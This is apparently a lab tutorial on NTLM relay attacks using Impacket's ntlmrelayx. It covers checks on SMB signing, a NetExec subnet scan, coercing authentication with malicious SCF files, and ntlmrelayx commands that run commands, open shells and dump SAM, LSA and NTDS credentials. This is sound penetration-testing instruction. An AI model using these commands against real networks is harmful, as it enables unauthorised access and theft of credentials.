# NTLM Relay Attack

NTLMRelayX is a tool in the Impacket suite used to perform NTLM relay attacks on internal networks. It captures NTLM authentication requests (often via tools like Responder) and relays them to another target, typically an SMB or HTTP service, to authenticate as the victim. If the relayed user has privileges on the target system, NTLMRelayX can execute commands, dump SAM hashes, or even create backdoors — all without cracking the password.

**Conditions for NTLM Relay to SMB:**
- SMB signing must be `disabled` on the `relay target` (he machine we relay credentials *to*)
- The victim account must have local administrator privileges on the target
- Note: SMB signing status on the **victim machine** is irrelevant

To verify that SMB signing is turned OFF

```
Get-SmbServerConfiguration | Select RequireSecuritySignature
Get-SmbClientConfiguration | Select RequireSecuritySignature
```

We disable SMB signing on the target (for lab practice):

```
Set-SmbServerConfiguration -RequireSecuritySignature $false
Set-SmbClientConfiguration -RequireSecuritySignature $false
```

Then check the entire network were the SMB signing is `OFF` to make this attack possible

```
nxc smb 192.168.0.0/24                                        
SMB         192.168.0.7     445    INTERNAL-DC      [*] Windows Server 2022 Build 20348 x64 (name:INTERNAL-DC) (domain:internal.cyber) (signing:False) (SMBv1:False)
SMB         192.168.0.6     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:marvel.local) (signing:False) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Here we found that the SMB signing in the two system is turned OFF which is the required condition for the NTLM Relay Attack and We use a malicious SCF file (or WebDAV, LNKNAP, etc) hosted via SMB_Killer / Responder / Inveigh to trigger outgoing NTLM authentication from the victim when they open the malicious share or file. smbkiller is available in online, [example](https://github.com/overgrowncarrot1/SMB_Killer)

```
# When the smbkiller generated file is transfer and file is opened by the machine relaying to
impacket-ntlmrelayx -smb2support -t 192.168.0.7 -c 'whoami'   

# To dump the sam hashes
impacket-ntlmrelayx -smb2support -t 192.168.0.7

# Interactive SMB shell + manual SAM/LSA dump
impacket-ntlmrelayx -t 192.168.0.7 -smb2support -i

# Auto-dump SAM,LSA,and NTDS (if DC)
impacket-ntlmrelayx -t 192.168.0.7 -smb2support --dump-sam --dump-lsass

# Relay to multiple targets from a file (relay to all signing-disabled targets)
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

> Notes:
> SMB signing must be disabled only on the relay target. The victim machine can have signing enabled - it does not prevent the attack